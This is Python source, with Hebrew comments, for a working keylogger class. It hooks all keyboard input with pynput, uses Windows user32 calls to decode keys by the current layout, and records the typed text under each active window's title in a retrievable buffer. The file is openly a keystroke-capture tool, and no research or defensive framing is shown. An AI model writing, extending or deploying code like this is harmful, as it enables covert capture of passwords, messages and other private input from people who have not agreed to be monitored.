from pynput import keyboard
import threading
import ctypes
import time
import platform
from ctypes import wintypes
from activ_windo import ActiveWindowDetector


class KeyLogger:
    def __init__(self):
        self.current_keys = []
        self.lock = threading.Lock()
        self.listener = None
        self.platform_system = platform.system()
        self.window_detector = ActiveWindowDetector()
        if self.platform_system == "Windows":
            self.user32 = ctypes.WinDLL('user32', use_last_error=True)
            self.windows_api()

    def windows_api(self):
        if self.platform_system == "Windows":
            """הגדרת פונקציות ומבנים מ-Windows API"""
            self.user32.GetForegroundWindow.restype = wintypes.HWND
            self.user32.GetWindowTextW.argtypes = [wintypes.HWND, wintypes.LPWSTR, wintypes.INT]
            self.user32.GetWindowTextW.restype = wintypes.INT
            self.user32.GetWindowThreadProcessId.argtypes = [wintypes.HWND, ctypes.POINTER(wintypes.DWORD)]
            self.user32.GetWindowThreadProcessId.restype = wintypes.DWORD
            self.user32.GetKeyboardLayout.argtypes = [wintypes.DWORD]
            self.user32.GetKeyboardLayout.restype = wintypes.HKL
            self.user32.ToUnicodeEx.argtypes = [
                wintypes.UINT,  # wVirtKey
                wintypes.UINT,  # wScanCode
                ctypes.POINTER(wintypes.BYTE),  # lpKeyState
                ctypes.POINTER(wintypes.WCHAR),  # pwszBuff
                ctypes.c_int,  # cchBuff
                wintypes.UINT,  # wFlags
                wintypes.HKL  # dwhkl
            ]
            self.user32.ToUnicodeEx.restype = ctypes.c_int
            self.user32.GetKeyboardState.argtypes = [ctypes.POINTER(wintypes.BYTE * 256)]
            self.user32.MapVirtualKeyExW.argtypes = [wintypes.UINT, wintypes.UINT, wintypes.HKL]
            self.user32.MapVirtualKeyExW.restype = wintypes.UINT

    def start_logging(self):
        """התחלת ההאזנה ללחיצות מקלדת"""
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        return self

    def stop_logging(self):
        """עצירת ההאזנה"""
        if self.listener:
            self.listener.stop()

    def get_active_window(self):
        return self.window_detector.get_active_window_name()



    def get_keyboard_layout(self):
        """קבלת מזהה פריסת המקלדת הנוכחית"""
        hwnd = self.user32.GetForegroundWindow()
        process_id = wintypes.DWORD()
        thread_id = self.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(process_id))
        return self.user32.GetKeyboardLayout(thread_id)

    def on_press(self, key):
        """טיפול באירוע לחיצת מקש"""
        with self.lock:
            try:
                key_str = self._format_key(key)
                if key_str:
                    window_name = self.get_active_window()
                    timestamp = time.strftime("%Y-%m-%d %H:%M")  # שמירת זמן ברמת דקה
                    if not self.current_keys or window_name not in self.current_keys[-1]:
                        self.current_keys.append({window_name: key_str})
                    else:
                        self.current_keys[-1][window_name] += key_str

                    print(f"{window_name} : {key_str}")
            except Exception as e:
                print(f"Error handling key: {e}")

    def _format_key(self, key):
        """תרגום המקש לתו לפי השפה הנוכחית"""
        if self.platform_system == "Windows":
            special_keys = {
                keyboard.Key.space: ' ',
                keyboard.Key.enter: '[ENTER]\n',
                keyboard.Key.tab: '[TAB]',
                keyboard.Key.backspace: '[BACKSPACE]',
                keyboard.Key.esc: '[ESC]'
            }
            if key in special_keys:
                return special_keys[key]
            vk = scancode = None
            if isinstance(key, keyboard.KeyCode):
                vk = key.vk
                current_hkl = self.get_keyboard_layout()
                scancode = self.user32.MapVirtualKeyExW(vk, 0, current_hkl)
            else:
                return f"[{key.name}]"

            keystate = (wintypes.BYTE * 256)()
            self.user32.GetKeyboardState(ctypes.byref(keystate))
            buff = ctypes.create_unicode_buffer(5)
            ret = self.user32.ToUnicodeEx(vk, scancode, keystate, buff, 5, 0, current_hkl)

            if ret > 0:
                return buff.value[:ret]
            return f"[{key.name}]"



        if isinstance(key, keyboard.KeyCode):
            return key.char if key.char else f"[{key.vk}]"

        return f"[{key.name}]"

    def get_logged_keys(self):
        return self.current_keys

    def clear_buffer(self):
        self.current_keys = []

